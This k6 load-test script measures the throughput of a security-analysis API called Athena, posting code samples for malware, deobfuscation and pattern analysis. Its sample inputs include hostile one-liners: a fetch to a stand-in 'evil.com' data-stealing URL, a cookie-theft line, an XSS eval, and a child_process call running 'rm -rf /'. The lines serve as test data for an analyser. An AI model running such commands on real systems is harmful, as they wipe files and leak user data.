import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';
import { randomString, randomItem } from 'https://jslib.k6.io/k6-utils/1.2.0/index.js';

// Custom metrics
const errorRate = new Rate('errors');
const analysisTime = new Trend('analysis_time');
const cacheHitRate = new Rate('cache_hits');

// Test configuration
export const options = {
  stages: [
    { duration: '2m', target: 50 },   // Ramp up to 50 users
    { duration: '5m', target: 100 },  // Stay at 100 users
    { duration: '3m', target: 200 },  // Ramp up to 200 users
    { duration: '5m', target: 200 },  // Stay at 200 users
    { duration: '2m', target: 0 },    // Ramp down to 0 users
  ],
  thresholds: {
    http_req_duration: ['p(95)<2000'], // 95% of requests must complete below 2s
    http_req_failed: ['rate<0.1'],     // Error rate must be below 10%
    errors: ['rate<0.1'],              // Custom error rate below 10%
  },
};

const BASE_URL = __ENV.BASE_URL || 'http://localhost:3000';
const API_KEY = __ENV.API_KEY || 'test-key';

// Test data
const analysisTypes = [
  'MALWARE_ANALYSIS',
  'DEOBFUSCATION',
  'PATTERN_DETECTION',
  'GENERAL_ANALYSIS',
  'URL_ANALYSIS',
  'BINARY_ANALYSIS',
  'CODE_REVIEW'
];

const sampleContents = [
  'function maliciousCode() { eval("alert(\'XSS\')"); }',
  'const data = btoa("sensitive information");',
  'fetch("http://evil.com/steal-data").then(r => r.json());',
  'document.cookie = "stolen=" + document.cookie;',
  'require("child_process").exec("rm -rf /");',
  'var _0x1234=["log","Hello"];console[_0x1234[0]](_0x1234[1]);'
];

const providers = ['claude', 'deepseek', 'openai', 'auto'];

export function setup() {
  // Warm up the cache with some requests
  console.log('Warming up cache...');
  for (let i = 0; i < 10; i++) {
    const payload = {
      content: randomItem(sampleContents),
      analysisType: randomItem(analysisTypes),
      provider: 'auto'
    };
    
    http.post(`${BASE_URL}/api/v1/analyze`, JSON.stringify(payload), {
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': API_KEY
      }
    });
  }
  sleep(1);
}

export default function() {
  // Scenario 1: Basic analysis request
  basicAnalysisTest();
  
  // Scenario 2: Workflow execution
  if (Math.random() < 0.3) {
    workflowTest();
  }
  
  // Scenario 3: Batch analysis
  if (Math.random() < 0.2) {
    batchAnalysisTest();
  }
  
  // Scenario 4: Streaming analysis
  if (Math.random() < 0.1) {
    streamingAnalysisTest();
  }
  
  sleep(randomIntBetween(1, 3));
}

function basicAnalysisTest() {
  const payload = {
    content: randomItem(sampleContents) + randomString(10),
    analysisType: randomItem(analysisTypes),
    provider: randomItem(providers),
    options: {
      includeMetrics: true,
      timeout: 30000
    }
  };
  
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': API_KEY
    },
    tags: { name: 'AnalysisRequest' }
  };
  
  const startTime = new Date();
  const response = http.post(`${BASE_URL}/api/v1/analyze`, JSON.stringify(payload), params);
  const endTime = new Date();
  
  // Check response
  const success = check(response, {
    'status is 200': (r) => r.status === 200,
    'response has result': (r) => r.json('result') !== undefined,
    'response time < 2s': (r) => r.timings.duration < 2000,
  });
  
  // Record metrics
  errorRate.add(!success);
  analysisTime.add(endTime - startTime);
  
  // Check if response was cached
  if (response.headers['X-Cache'] === 'HIT') {
    cacheHitRate.add(1);
  } else {
    cacheHitRate.add(0);
  }
}

function workflowTest() {
  const workflowPayload = {
    steps: [
      {
        action: 'ANALYZE',
        params: {
          content: randomItem(sampleContents),
          analysisType: 'MALWARE_ANALYSIS'
        }
      },
      {
        action: 'DEOBFUSCATE',
        params: {
          content: 'var _0x1234=["test"];'
        }
      },
      {
        action: 'SCAN_PATTERNS',
        params: {
          content: 'eval("code")'
        }
      }
    ]
  };
  
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': API_KEY
    },
    tags: { name: 'WorkflowRequest' }
  };
  
  const response = http.post(
    `${BASE_URL}/api/v1/workflows/security-analysis`,
    JSON.stringify(workflowPayload),
    params
  );
  
  check(response, {
    'workflow status is 200': (r) => r.status === 200,
    'workflow has results': (r) => r.json('results') !== undefined,
  });
}

function batchAnalysisTest() {
  const batchPayload = {
    requests: Array.from({ length: 5 }, () => ({
      content: randomItem(sampleContents),
      analysisType: randomItem(analysisTypes),
      provider: 'auto'
    }))
  };
  
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': API_KEY
    },
    tags: { name: 'BatchRequest' },
    timeout: '10s'
  };
  
  const response = http.post(
    `${BASE_URL}/api/v1/analyze/batch`,
    JSON.stringify(batchPayload),
    params
  );
  
  check(response, {
    'batch status is 200': (r) => r.status === 200,
    'batch has all results': (r) => r.json('results.length') === 5,
  });
}

function streamingAnalysisTest() {
  const streamPayload = {
    content: sampleContents.join('\n'),
    analysisType: 'PATTERN_DETECTION',
    provider: 'claude',
    stream: true
  };
  
  const params = {
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': API_KEY,
      'Accept': 'text/event-stream'
    },
    tags: { name: 'StreamRequest' }
  };
  
  const response = http.post(
    `${BASE_URL}/api/v1/analyze/stream`,
    JSON.stringify(streamPayload),
    params
  );
  
  check(response, {
    'stream status is 200': (r) => r.status === 200,
  });
}

export function handleSummary(data) {
  return {
    'stdout': textSummary(data, { indent: ' ', enableColors: true }),
    'summary.json': JSON.stringify(data),
    'summary.html': htmlReport(data),
  };
}

// Helper function
function randomIntBetween(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

// Custom summary function
function textSummary(data, options) {
  const { metrics } = data;
  const duration = (data.state.testRunDurationMs / 1000).toFixed(2);
  
  return `
Load Test Summary
=================
Duration: ${duration}s
VUs (max): ${metrics.vus.values.max}
Requests: ${metrics.http_reqs.values.count}
Request Rate: ${metrics.http_reqs.values.rate.toFixed(2)}/s

Response Times:
  Median: ${metrics.http_req_duration.values.med.toFixed(2)}ms
  95th %: ${metrics.http_req_duration.values['p(95)'].toFixed(2)}ms
  99th %: ${metrics.http_req_duration.values['p(99)'].toFixed(2)}ms

Error Rate: ${(metrics.errors.values.rate * 100).toFixed(2)}%
Cache Hit Rate: ${(metrics.cache_hits.values.rate * 100).toFixed(2)}%

Checks:
  Passed: ${metrics.checks.values.passes}
  Failed: ${metrics.checks.values.fails}
  `;
}

// HTML report generator
function htmlReport(data) {
  return `
<!DOCTYPE html>
<html>
<head>
    <title>Athena Load Test Results</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .metric { margin: 10px 0; padding: 10px; background: #f0f0f0; }
        .passed { color: green; }
        .failed { color: red; }
        h1, h2 { color: #333; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>Athena Platform Load Test Results</h1>
    <h2>Test Summary</h2>
    <div class="metric">
        <strong>Duration:</strong> ${(data.state.testRunDurationMs / 1000).toFixed(2)}s<br>
        <strong>Total Requests:</strong> ${data.metrics.http_reqs.values.count}<br>
        <strong>Request Rate:</strong> ${data.metrics.http_reqs.values.rate.toFixed(2)}/s<br>
        <strong>Error Rate:</strong> <span class="${data.metrics.errors.values.rate < 0.1 ? 'passed' : 'failed'}">${(data.metrics.errors.values.rate * 100).toFixed(2)}%</span>
    </div>
    
    <h2>Response Time Distribution</h2>
    <table>
        <tr>
            <th>Percentile</th>
            <th>Response Time (ms)</th>
        </tr>
        <tr>
            <td>Median (50th)</td>
            <td>${data.metrics.http_req_duration.values.med.toFixed(2)}</td>
        </tr>
        <tr>
            <td>95th</td>
            <td>${data.metrics.http_req_duration.values['p(95)'].toFixed(2)}</td>
        </tr>
        <tr>
            <td>99th</td>
            <td>${data.metrics.http_req_duration.values['p(99)'].toFixed(2)}</td>
        </tr>
    </table>
    
    <h2>Thresholds</h2>
    <ul>
        ${Object.entries(data.metrics).map(([name, metric]) => {
            if (metric.thresholds) {
                const passed = Object.values(metric.thresholds).every(t => t.ok);
                return `<li class="${passed ? 'passed' : 'failed'}">${name}: ${passed ? 'PASSED' : 'FAILED'}</li>`;
            }
            return '';
        }).join('')}
    </ul>
</body>
</html>
  `;
}